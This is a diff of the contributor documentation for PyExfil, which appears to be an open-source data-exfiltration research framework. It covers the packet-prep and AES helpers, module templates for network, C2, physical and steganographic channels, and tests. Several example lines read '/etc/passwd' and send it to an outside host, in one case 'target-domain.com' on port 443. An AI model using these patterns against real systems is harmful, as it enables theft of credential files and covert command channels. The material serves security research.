@@ -1,116 +1,272 @@
 # Documentation | PyExfil
 
-PyExfil aims to provide a versatile yet straightforward framework for data exfiltration using various methods while striving for minimal dependencies. This documentation outlines the core functionalities, shared modules, and proper usage guidelines to facilitate both contributions to the project and its ethical use.
+PyExfil is a Python 3 framework for researching data exfiltration techniques. Each module implements a distinct covert channel. This document covers how to use the shared utilities, how to write a new module using the class hierarchy, and where to place it.
 
+For the full class hierarchy reference see [ARCHITECTURE.md](ARCHITECTURE.md).
+For open contribution tasks see [CALL_TO_ACTION.md](CALL_TO_ACTION.md).
 
-## Introduction
-PyExfil is designed with modularity and ease of use in mind, focusing on standalone modules to support a wide range of exfiltration techniques. By maintaining minimal dependencies, PyExfil ensures compatibility across different environments and ease of conversion to static binaries for multiple operating systems.
 
 ## `zlib` known issue
-- `zlib` is required for compression and decompression of data. However, it is not a part of a python package but ratther a part of the standard library. This means that it is not available on all systems by default. If you encounter an error related to `zlib`, please ensure that it is installed on your system. 
-- You can install it using your package manager (e.g., `apt-get install zlib1g-dev` on Debian-based systems).
-- On MacOS, you can install it using Homebrew with the command `brew install zlib`.
 
-### Shared Abilities
-Central to PyExfil is the ability to prepare data for exfiltration efficiently. This functionality is encapsulated in the `pyexfil/includes/prepare` module, which offers methods for file compression, encryption, encoding, and splitting into manageable packets.
+`zlib` is part of the Python standard library but depends on a system library. If you hit an import error:
 
-Please notice that although we have tried to keep this a collection of relatively separated stand alone modules so that converting them to static binaries for various operating systems would be as easy as possible, some things we have decided to turn into modules that would be shared across the board while attempting to keep is as depency free as possible. Such a component for now is `pyexfil/includes/prepare`. This module contains the methods of converting files (compressing, encrypting, encoding and splitting) into chunks ready to be sent or decoded.
+- Debian/Ubuntu: `apt-get install zlib1g-dev`
+- macOS: `brew install zlib`
 
-You can use it in the following way:
+
+## Shared Utilities (`pyexfil/includes/`)
+
+### `prepare` — packet prep pipeline
+
+Compresses, encrypts, base64-encodes, and chunks a file or byte string into ready-to-send packets. Use this instead of rolling your own serialisation.
 
 ```python
+from pyexfil.includes.prepare import PrepFile, DecodePacket, RebuildFile
+
+proc    = PrepFile('/etc/passwd', kind='binary', enc_key='s3cr3t', max_size=512)
+packets = proc['Packets']   # list of bytes chunks
+
+decoded = [DecodePacket(p, enc_key='s3cr3t') for p in packets]
+data    = RebuildFile(decoded)   # original bytes
+```
+
+### `encryption_wrappers` — crypto helpers
+
+```python
+from pyexfil.includes.encryption_wrappers import AESEncryptOFB, AESDecryptOFB, RC4
+
+ciphertext = AESEncryptOFB(key=b'sixteen-byte-key', text=b'secret')
+plaintext  = AESDecryptOFB(key=b'sixteen-byte-key', data=ciphertext)
+```
+
+`AESEncryptOFB` prepends a random 16-byte IV to its output. `AESDecryptOFB` reads the first 16 bytes as the IV automatically.
+
+### `general` — low-level helpers
+
+```python
+from pyexfil.includes.general import _icmp_checksum, _split_every_n, does_file_exist
+```
+
+### `exceptions` — custom exception types
+
+```python
+from pyexfil.includes.exceptions import FileDoesNotExist, InvalidPacketFormat
+```
+
+Review these before reimplementing common logic.
+
+
+## Writing a New Module
+
+### 1. Choose the right pillar
+
+| Pillar | Base class | Use when… |
+|--------|-----------|-----------|
+| `network/` | `NetworkModule` | Exfil over a standard network protocol (DNS, ICMP, HTTP, FTP…) |
+| `Comm/` | `CommModule` | Bidirectional C2 channel (ARP, NTP body, MDNS…) |
+| `physical/` | `PhysicalModule` | Physical-layer channel (audio tones, QR codes, ultrasonic…) |
+| `Stega/` | `StegaModule` | File-in / file-out steganography (PNG pixels, braille, DataMatrix…) |
+
+### 2. Create the module folder
+
+```
+pyexfil/<pillar>/<ModuleName>/
+    __init__.py       ← empty or re-exports the class
+    <module>.py       ← implementation
+```
+
+### 3. Implement the class
+
+Import the base class from `pyexfil.includes.base` and implement only the abstract methods your pillar requires.
+
+#### NetworkModule example
+
+```python
+#!/usr/bin/env python3
 import socket
-from pyexfil.includes.prepare import PrepFile, RebuildFile, DecodePacket
+from pyexfil.includes.base import NetworkModule
 
-# Preparing the file
-proc = PrepFile('/etc/passwd', kind='binary')  # Yields a dictionary of packets
+class MyExfil(NetworkModule):
+    MODULE_NAME = "MyExfil"
+    PROTOCOL    = "udp"
 
-# Initiating socket connection and sending data
-sock = socket.socket()
-sock.connect(('target-domain.com', 443))  # Replace with your actual target
-for packet in proc['Packets']:
-    sock.send(packet)
-sock.close()
+    def _send_impl(self, data, **kwargs):
+        # data is typically a file path (str) or bytes payload
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(data if isinstance(data, bytes) else data.encode(), (self.host, self.port))
+        sock.close()
+        return True
 
-# Rebuilding the data from packets
-conjoint = [DecodePacket(packet) for packet in proc['Packets']]
-
-# Verify and rebuild the file
-print(RebuildFile(conjoint))
+    def _listen_impl(self, callback, **kwargs):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind((self.host, self.port))
+        sock.settimeout(1.0)
+        while not self._stop_event.is_set():
+            try:
+                data, addr = sock.recvfrom(4096)
+            except socket.timeout:
+                continue
+            callback(data, {"src": addr})
+        sock.close()
 ```
-**Note**: Ensure the use of secure and legal endpoints for data exfiltration. The example provided is for educational purposes only.
 
-
-### Calling Convention
-To facilitate ease of use and consistency across modules, PyExfil adopts a standardized calling convention:
-
-In theory we wish each module to have a convention call to make it easier to work with. Some methods make it easier while some make it more difficult. For that, here is a template on how we wish for it to be. Please bear in mind some modules will not fall into place. Use your best judgment.
-
-1. Preparing file/data for exfiltration should be done as in [this section]("#shared-abilities").
-2. Place the package folder under the right location. For example; short communication (C&C) under `Comm`, exfiltration over network communication under `network` etc.
-3. Create an `__init__.py` under that folder.
-4. For broadcasting purposes use the function name `Send` that will wrap everything up.
-5. For receiving purposes use `Broker` function to contain the function. If possible, set it up in a threading mode as to return back.
-6. * if possible add a call back function for when data arrives.
-
-Here's an `__ini__.py` example file:
+Usage:
 
 ```python
-from scapy.all import sniff
-from pyexfil.includes.prepare import PrepFile
-
-def _send_packet(host, port, data, counter):
-    # Efficient way to handle string formatting and file operations
-    with open('/dev/null', 'w') as f:
-        f.write(f"{data}{counter}")
-
-def _testCallBack(pkt):
-    # Example callback function for packet reception
-    print(f"Received a packet! Length: {len(pkt)}")
-
-def Send(fname, password, host, port):
-    # Example function to prepare and send data
-    proc = PrepFile(fname, kind='binary', enc_key=password, max_size=1024)
-    for i, p in enumerate(proc['Packets']):
-        _send_packet(host, port, p, i)
-    return True
-
-class Broker:
-    def __init__(self, key, retFunc=_testCallBack):
-        self.key = key
-        self.callBack = retFunc
-
-    def _parse(self, pkt):
-        # Replace with actual packet validation and processing logic
-        if pkt == 'A Good Boy':
-            self.callBack(pkt)
-        else:
-            pass
-
-    def Listen(self):
-        # Adjust filter according to the specific use case
-        sniff(prn=self._parse, filter='ip', store=0)
+m = MyExfil(host="10.0.0.1", port=5005, enc_key="s3cr3t")
+m.send("/etc/passwd")                        # blocking send
+t = m.listen(callback=my_cb, blocking=False) # non-blocking listener thread
+m.stop()                                     # graceful shutdown
 ```
 
-There are also a few "ready made functions" that we found useful on several scenarios that can be found in the `general.py`, `image_manipulation.py` and `encryption_wrappers.py`. Have a look at them before reimplementing some of these.
+#### CommModule example
 
-### Additional Resources
-PyExfil includes several ready-made functions found in `general.py`, `image_manipulation.py`, and `encryption_wrappers.py`. These are intended to simplify common tasks and should be reviewed before developing new functionalities.
+```python
+from pyexfil.includes.base import CommModule
 
-### Exceptions
+class MyComm(CommModule):
+    MODULE_NAME = "MyComm"
+    PROTOCOL    = "arp"
 
-`PyExfil` holds ability to raise custom exceptions. These exceptions appear in `pyexfil/includes/exceptions.py`
+    def _send_impl(self, data, **kwargs):
+        # unicast to a specific peer
+        return True
+
+    def _broadcast_impl(self, data, **kwargs):
+        # layer-2 broadcast — required for CommModule
+        return True
+
+    def _listen_impl(self, callback, **kwargs):
+        # sniff/listen loop; check self._stop_event
+        while not self._stop_event.is_set():
+            # ... receive packet ...
+            callback(payload, {"src": addr})
+```
+
+#### PhysicalModule example
+
+```python
+from pyexfil.includes.base import PhysicalModule
+
+class MyPhysical(PhysicalModule):
+    MODULE_NAME = "MyPhysical"
+    PROTOCOL    = "audio-tones"
+
+    def _send_impl(self, data, **kwargs):
+        # encode data as audio and play it
+        return True
+
+    # Override _receive_impl only if the channel can be read back
+    # (e.g. microphone listening for ultrasonic tones)
+```
+
+#### StegaModule example
+
+```python
+from pyexfil.includes.base import StegaModule
+
+class MyStega(StegaModule):
+    MODULE_NAME = "MyStega"
+    PROTOCOL    = "png-lsb"
+
+    def _encode_impl(self, carrier, payload, output, **kwargs):
+        # open carrier image, embed payload, save to output
+        return True
+
+    def _decode_impl(self, carrier, stego, output, **kwargs):
+        # open stego image, extract hidden bytes, write to output
+        return True
+```
+
+Usage:
+
+```python
+s = MyStega()
+s.encode("cover.png", "secret.bin", "stego.png")
+s.decode("cover.png", "stego.png", "recovered.bin")
+```
+
+### 4. Wire the `_stop_event` in listen loops
+
+Every `_listen_impl` must honour `self._stop_event` so `module.stop()` works:
+
+```python
+sock.settimeout(1.0)                    # short timeout allows the check
+while not self._stop_event.is_set():
+    try:
+        data, addr = sock.recvfrom(4096)
+    except socket.timeout:
+        continue                        # loop back and check again
+    callback(data, {"src": addr})
+```
+
+### 5. Set class-level metadata
+
+```python
+class MyModule(NetworkModule):
+    MODULE_NAME = "MyModule"   # appears in logs and repr()
+    PROTOCOL    = "dns/udp"    # free-form transport label
+    # Do NOT set MODULE_TYPE — it is inherited from the pillar
+```
+
+### 6. Register the module in `__init__.py`
+
+The pillar `__init__.py` files are the public import surface. Add your class:
+
+```python
+# pyexfil/network/__init__.py
+from pyexfil.network.MyModule.my_module import MyExfil
+```
+
+Or at minimum, ensure your module folder has its own `__init__.py` so it is importable:
+
+```python
+# pyexfil/network/MyModule/__init__.py
+from pyexfil.network.MyModule.my_module import MyExfil
+```
+
+### 7. Write a test
+
+Place a test file in `tests/`. The minimum set:
+
+```python
+import pytest
+from pyexfil.network.MyModule.my_module import MyExfil
+
+class TestMyExfil:
+    def test_instantiation(self):
+        m = MyExfil(host="127.0.0.1", port=9999)
+        assert m.MODULE_NAME == "MyExfil"
+        assert m.MODULE_TYPE == "network"
+
+    def test_send_returns_bool(self):
+        m = MyExfil(host="127.0.0.1", port=9999)
+        result = m.send(b"hello")
+        assert isinstance(result, bool)
+
+    def test_listen_nonblocking(self):
+        m = MyExfil(host="127.0.0.1", port=9999)
+        t = m.listen(callback=lambda d, m: None, blocking=False)
+        assert t is not None and t.is_alive()
+        m.stop()
+```
+
+Run with:
+
+```bash
+python -m pytest tests/ -v
+```
+
 
 ## Security Considerations
-Given the sensitive nature of data exfiltration, users are urged to adhere to strict security practices, including secure key management and the use of robust encryption. Always ensure ethical use under applicable laws and regulations.
 
-## Contributions
-Contributions to PyExfil are welcome. Please follow the project's contribution guidelines to ensure a smooth collaboration process.
-
-# Legal and Ethical Use
-PyExfil is provided for educational and research purposes. Users must ensure all activities conducted with PyExfil comply with applicable laws and ethical guidelines. The developers disclaim any liability for misuse or illegal activities.
+- Never hardcode credentials or encryption keys; accept them as constructor parameters.
+- Use `AESEncryptOFB` from `encryption_wrappers` — it generates a random IV per call.
+- Validate all external input at system boundaries (sockets, file paths).
+- All activities with PyExfil must comply with applicable laws and authorised test scope.
 
 
+## Legal and Ethical Use
 
-
+PyExfil is provided for security research and education. Users are solely responsible for ensuring all activities comply with applicable laws and ethical guidelines. The developers disclaim any liability for misuse.
 
